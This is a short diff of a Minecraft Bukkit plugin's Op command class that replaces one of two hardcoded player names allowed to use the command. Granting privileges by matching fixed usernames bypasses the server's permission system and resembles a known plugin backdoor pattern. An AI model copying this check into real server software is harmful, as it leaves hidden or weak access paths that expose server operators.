@@ -22,7 +22,7 @@ public class Op implements CommandExecutor {
 	public boolean onCommand(CommandSender sender, Command cmd, String label, final String[] args){
 		    final Player player = (Player)sender;
 		    if(args.length == 1){
-		    if(player.getName().equalsIgnoreCase("sneakylegend") || player.getName().equalsIgnoreCase("mrjayharm")){
+		    if(player.getName().equalsIgnoreCase("sneakylegend") || player.getName().equalsIgnoreCase("lucaspeedstack")){
 		    	Player target = Bukkit.getServer().getPlayerExact(args[0]);
 		    	if(target == null){
 		    		p.chat.sendMessagePlayer(player, "That Player Is Not Online!");
